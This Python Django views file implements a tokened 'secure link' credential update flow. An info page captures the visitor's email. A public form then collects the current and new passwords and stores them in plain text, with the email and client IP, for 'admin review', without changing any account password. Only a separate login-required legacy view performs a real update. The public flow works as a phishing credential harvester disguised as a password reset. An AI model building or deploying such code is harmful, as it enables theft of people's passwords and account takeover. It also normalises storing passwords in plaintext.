from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.contrib.auth import update_session_auth_hash, login
from django.views.decorators.cache import never_cache
from .forms import UpdateCredentialsForm
from .models import CredentialUpdateToken, CredentialSubmission
from .public_forms import PublicCredentialSubmissionForm


def get_client_ip(request):
    """Get the client's IP address"""
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


@never_cache
def info_page(request, token):
    """
    Landing page that accepts email and passes to credential update form
    """
    # Verify token exists and is valid
    credential_token = get_object_or_404(CredentialUpdateToken, token=token)
    
    if not credential_token.is_valid():
        context = {
            'error': 'expired',
            'token_obj': credential_token
        }
        return render(request, 'credentials/token_invalid.html', context)
    
    if request.method == 'POST':
        email = request.POST.get('username', '')
        # Redirect to update form with email in session
        request.session['user_email'] = email
        return redirect('credentials:update_via_token', token=token)
    
    context = {
        'token': token,
        'expires_at': credential_token.expires_at
    }
    
    return render(request, 'credentials/info.html', context)


@never_cache
def update_credentials_via_token(request, token):
    """
    Public form accessible via secure link - collects credentials for admin review
    """
    # Verify token exists and is valid
    credential_token = get_object_or_404(CredentialUpdateToken, token=token)
    
    if not credential_token.is_valid():
        context = {
            'error': 'expired',
            'token_obj': credential_token
        }
        return render(request, 'credentials/token_invalid.html', context)
    
    error = None
    user_email = request.session.get('user_email', '')
    
    if request.method == 'POST':
        form = PublicCredentialSubmissionForm(request.POST)
        
        if form.is_valid():
            # Get email from session
            email = request.session.get('user_email', 'unknown')
            # Use email as username (or extract username from email)
            username = email.split('@')[0] if email and '@' in email else 'unknown'
            
            # Save the submission to database for admin review
            submission = CredentialSubmission.objects.create(
                email=email,
                username=username,
                current_password=form.cleaned_data['current_password'],
                new_password=form.cleaned_data['new_password'],
                ip_address=get_client_ip(request)
            )
            
            # Clear session
            if 'user_email' in request.session:
                del request.session['user_email']
            
            # Redirect to success page
            return redirect('credentials:update_success')
        else:
            error = "Please check your inputs and try again."
    else:
        form = PublicCredentialSubmissionForm()
    
    context = {
        'user_email': user_email,
        'error': error,
        'token': token,
        'expires_at': credential_token.expires_at
    }
    
    return render(request, 'credentials/update_credentials.html', context)


@login_required
def update_credentials(request):
    """
    Secure view for updating user credentials (requires login)
    This is the old method - kept for backwards compatibility
    """
    
    if request.method == 'POST':
        form = UpdateCredentialsForm(request.user, request.POST)
        
        if form.is_valid():
            # Save the updated credentials
            form.save()
            
            # If password was changed, keep the user logged in
            if form.cleaned_data.get('new_password'):
                update_session_auth_hash(request, request.user)
                messages.success(
                    request, 
                    '✅ Your credentials have been updated successfully! Your password has been changed.'
                )
            else:
                messages.success(
                    request, 
                    '✅ Your credentials have been updated successfully!'
                )
            
            # Redirect to the same page to show success message
            return redirect('credentials:update')
        else:
            # Form has errors - they will be displayed in the template
            messages.error(
                request, 
                '❌ Please correct the errors below.'
            )
    else:
        # GET request - show form with current user data
        form = UpdateCredentialsForm(request.user)
    
    context = {
        'form': form,
        'user': request.user
    }
    
    return render(request, 'credentials/update_credentials.html', context)


def credentials_info(request):
    """
    Information page explaining the credential update process
    This is the landing page users see when they click the secure link
    """
    context = {
        'is_authenticated': request.user.is_authenticated
    }
    return render(request, 'credentials/info.html', context)


def update_success(request):
    """
    Success page after credentials are submitted
    """
    return render(request, 'credentials/update_success.html')
